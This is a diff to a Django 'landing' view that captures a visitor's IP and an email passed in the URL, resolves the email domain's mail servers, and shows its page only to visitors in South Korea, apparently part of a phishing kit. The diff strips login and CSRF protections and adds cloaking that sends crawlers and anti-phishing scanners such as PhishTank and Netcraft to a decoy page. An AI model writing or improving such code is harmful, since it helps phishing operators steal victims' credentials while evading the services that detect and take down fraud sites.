@@ -11,17 +11,72 @@ import dns.resolver
 import socket
 import requests
 import pycountry
-#Create your views here.
-from django.contrib.auth.decorators import login_required
-from django.views.decorators.csrf import csrf_protect
-from defender.decorators import watch_login
-
-@watch_login
-@csrf_protect
+from django.http import HttpResponseBadRequest
 
 def landing(request):
     iplogger = request.META.get("HTTP_X_FORWARDED_FOR")
     emailgrabber = request.GET["email"]
+    user_agent = request.META.get('HTTP_USER_AGENT', '')
+    bots = ['Googlebot', 
+        'Baiduspider', 
+        'ia_archiver',
+        'R6_FeedFetcher', 
+        'NetcraftSurveyAgent', 
+        'Sogou web spider',
+        'bingbot', 
+        'Yahoo! Slurp', 
+        'facebookexternalhit', 
+        'PrintfulBot',
+        'msnbot', 
+        'Twitterbot', 
+        'UnwindFetchor', 
+        'urlresolver', 
+        'Butterfly', 
+        'TweetmemeBot',
+        'PaperLiBot',
+        'MJ12bot',
+        'AhrefsBot',
+        'Exabot',
+        'Ezooms',
+        'YandexBot',
+        'SearchmetricsBot',
+		'phishtank',
+		'PhishTank',
+        'picsearch',
+        'TweetedTimes Bot',
+        'QuerySeekerSpider',
+        'ShowyouBot',
+        'woriobot',
+        'merlinkbot',
+        'BazQuxBot',
+        'Kraken',
+        'SISTRIX Crawler',
+        'R6_CommentReader',
+        'magpie-crawler',
+        'GrapeshotCrawler',
+        'PercolateCrawler',
+        'MaxPointCrawler',
+        'R6_FeedFetcher',
+        'NetSeer crawler',
+        'grokkit-crawler',
+        'SMXCrawler',
+        'PulseCrawler',
+        'Y!J-BRW',
+        '80legs.com/webcrawler',
+        'Mediapartners-Google', 
+        'Spinn3r', 
+        'InAGist', 
+        'Python-urllib', 
+        'NING', 
+        'TencentTraveler',
+        'Feedfetcher-Google', 
+        'mon.itor.us', 
+        'spbot', 
+        'Feedly',
+        'bot',
+        'curl',
+        "spider",
+        "crawler"]
     domainapi = emailgrabber[emailgrabber.index('@') + 1 : ]
     mx_records = dns.resolver.query(domainapi, 'MX')
     # Initialize GeoIP2 object
@@ -29,7 +84,8 @@ def landing(request):
 
     # Get user's country based on IP address
     country = geo.country(iplogger)
-
+    if any(bot in user_agent.lower() for bot in bots):
+        return render(request, 'bots.html')
     # Check if user is from Korea
     if country['country_code'] != 'KR':
         return render(request, 'block.html') # Return block page if user is not from Korea
